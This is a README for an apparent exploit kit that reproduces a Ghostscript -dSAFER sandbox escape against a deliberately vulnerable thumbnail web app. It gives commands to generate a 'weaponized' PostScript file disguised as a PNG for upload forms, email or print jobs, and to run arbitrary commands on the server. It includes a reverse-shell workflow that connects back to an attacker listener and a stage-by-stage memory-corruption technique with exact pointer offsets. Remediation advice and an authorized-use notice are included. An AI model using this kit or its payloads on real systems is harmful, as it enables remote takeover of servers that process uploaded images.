# Upload2Shell Lab — CVE-2026-125396 (Ghostscript -dSAFER escape)

**AUTHORIZED LAB USE ONLY.** This package reproduces the *Upload2Shell*
vulnerability (CVE-2026-125396) on your own machine so you can see the
full remote chain with your own eyes:

```
HTTP upload → Flask + Pillow (EPS content sniffing)
            → Ghostscript 10.07.0 with -dSAFER
            → .putgstringcopy/.forceput font-loader flaw (use-after-free)
            → native memory control → path_control_active = 0
            → LockFilePermissions = false → %pipe% command execution
```

It is the PoC published by pwn.ai (research by Paulos Yibelo et al,
Nov 2026), extended from the "native operator swap" proof to full command
execution through Ghostscript's `%pipe%` device.

## Layout

| File | What it is |
|---|---|
| `Dockerfile` | Multi-stage build: compiles vulnerable **Ghostscript 10.07.0** from the upstream tarball, then installs a Flask + Pillow thumbnail service |
| `docker-compose.yml` | Runs the lab website on port **8000** |
| `app/app.py` | The (intentionally vulnerable) thumbnail web app |
| `app/templates/index.html` | The web UI |
| `exploit.py` | Attack driver: wraps the payload, uploads it disguised, verifies execution |
| `payloads/poc-rce.ps` | The weaponized PostScript payload (parameterized `__COMMAND__`) |
| `payloads/poc-native-write.ps` | pwn.ai's original native-write proof (marker: `29×11 = 18`) |
| `run_demo.sh` | One-command end-to-end demo |

## Quick start

```bash
cd upload2shell-lab
docker compose up -d --build          # builds gs 10.07.0 (~5-15 min) and starts the site
./run_demo.sh                          # end-to-end RCE demo against the site
```

`run_demo.sh` does exactly what a real engagement would do:

1. Uploads a **PostScript payload disguised as `scan-XXXX.png`**
   (`Content-Type: image/png`) to the public upload form — no login.
2. The app's Pillow call (`Image.open()` + `load()`) sniffs the *content*,
   decides it is EPS, and executes `gs -dSAFER …` on it.
3. The payload breaks out of the sandbox and runs
   `id; uname -a; hostname > /tmp/upload2shell_rce_<random>` inside the
   container as the app user (`appuser`).
4. The script prints the marker file contents — your live RCE proof:

```
uid=1000(appuser) gid=1000(appuser) groups=1000(appuser)
Linux <container-id> 6.x.x #1 SMP … x86_64 GNU/Linux
<container-hostname>
```

### Manual exploitation

```bash
# generate the weaponized file for any channel (upload form, email, print job):
python3 exploit.py --out shell.png --ext png

# run a custom command instead of the marker-file proof:
python3 exploit.py --url http://127.0.0.1:8000 \
    --ext png --content-type image/png \
    --command "/bin/sh -c 'id > /tmp/owned 2>&1'"

# verify on the target:
docker compose exec web cat /tmp/upload2shell_rce_* /tmp/owned
```

### Web UI

Open `http://127.0.0.1:8000`, drop `shell.png` on the form, and the payload
runs server-side while the page "renders the thumbnail".

### Interactive reverse shell (tested live)

```bash
nc -lvnp 4444                                        # attacker listener
python3 revshell.py --lhost <ATTACKER-IP> --lport 4444 --out shell.png
# deliver shell.png via the web UI or: python3 exploit.py --url http://127.0.0.1:8000 --ext png
```

The payload connects back, prints `PWNED-BY-UPLOAD2SHELL`, `id`, `hostname`,
`uname -sr`, then serves one command per line (`exit` to close) — a full
interactive shell as the rendering user.

## Local (no Docker) iteration

If you already have a vulnerable `gs` on PATH:

```bash
python3 exploit.py --out shell.ps
gs -q -dSAFER -dBATCH -dNOPAUSE shell.ps
cat /tmp/upload2shell_rce_*
```

## How the payload works (stage map)

| Stage | Technique |
|---|---|
| 1 | Writes its own Type 1 font to `%ram%` and registers it in `Fontmap` so `findfont` loads it |
| 2 | Font body swaps the loader's filename string for an array → `copy` raises `typecheck` *inside* `.putgstringcopy`, before its privileged `.forceput` |
| 3 | Custom `errordict /typecheck` handler recovers `.forceput` with attacker-chosen `dict/key/value`; `systemdict` store lands in LOCAL VM |
| 4 | `save`/`restore` frees the local string while `systemdict`'s reference survives → **use-after-free**; marker-filled integer arrays locate the overlapping ref |
| 5 | The live ref is re-typed into a byte view; Ghostscript's own pointers are followed: `psi_device_ref+0 → gx_device+24 → gs_memory_t+208 → gs_lib_ctx+8 → core+156 = path_control_active` |
| 6 | `path_control_active` zeroed → `-dSAFER`'s native gate off; second trap run force-writes `userparams/LockFilePermissions=false`; `save`/`restore` re-syncs the cached flag |
| 7 | `(%pipe%<command>) (w) file` executes the command as the rendering process's user |

Verified against Ghostscript 10.07.0 (x86-64). The same payload on the
**fixed 10.08.0** fails at the dangling-reference stage.

## Remediation (what the lab proves you need)

* Upgrade Ghostscript to **10.08.0** (or your distro's backported fix) —
  *inside every container image*, not just the host.
* Disable `PS,PS2,PS3,EPS,PDF,XPS` coders in ImageMagick `policy.xml` when
  not needed; validate file content before thumbnailing.
* Run renderers as a low-privilege user in a confined container (AppArmor/
  SELinux may stop the post-exploitation shell even when the sandbox breaks).

## Troubleshooting

**Build error on GCC >= 14** (`xps_alloc_table ... incompatible pointer type`, `Error 1` on `obj/xpstiff.o`):
newer GCC (13/14+) promotes several legacy warnings to hard errors inside
Ghostscript's unused-here XPS/PCL modules - and older GCCs reject the newer
`-Wno-error=` flag names outright, so no single fixed flag set works
everywhere. The Dockerfile therefore **probes each candidate flag** with a
one-line compile against the builder's actual GCC and only passes the ones
that compiler understands (works on GCC 11/12/13/14+). If you build by hand
on a rolling distro (Kali/Arch), do the same, e.g. start with
`-Wno-error=incompatible-pointer-types -Wno-error=implicit-function-declaration
-Wno-error=int-conversion -Wno-error=implicit-int`. These flags only affect
compile-time diagnostics, not the interpreter code the exploit exercises.

## Credits & references

* Research/PoC: pwn.ai — *"How We Hacked the Pipes"* (Paulos Yibelo et al.)
* CVE: CVE-2026-125396 (VulnCheck assignment, CVSSv4 8.5)
* Fix commit: `1484854e0c8ddfda1baa4ad4cd965b8a9790aa81` (ghostpdl)

**Use only against systems you own or are explicitly authorized to test.**
